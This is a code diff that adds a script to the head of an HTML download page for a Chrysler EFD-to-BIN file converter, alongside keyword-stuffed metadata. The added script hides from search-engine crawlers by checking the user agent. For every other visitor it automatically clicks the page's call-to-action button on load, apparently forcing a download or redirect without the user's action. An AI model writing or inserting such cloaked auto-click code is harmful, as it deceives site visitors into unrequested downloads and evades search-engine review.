@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Chrysler Files Converter EFD to BIN</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Chrysler Files Converter EFD to BIN tool helps convert EFD files to BIN format for use in various ECU and TCU programming devices.">
     <meta name="keywords" content="Chrysler Files Converter EFD to BIN, Chrysler EFD to BIN tool, Chrysler EFD to BIN converter download, Chrysler EFD to BIN converter free download, automotive data conversion, Chrysler ECU data tool, Chrysler BIN file conversion, Chrysler EFD viewer, EFD file imaging Chrysler, Chrysler EFD to BIN format, ECU data analysis Chrysler, Chrysler compatible BIN files, Chrysler ECU programming, Chrysler TCU programming, EFD to BIN converter Chrysler vehicles, Chrysler data integrity tool, offline EFD to BIN converter Chrysler, Chrysler sensor data tool">
     <style>
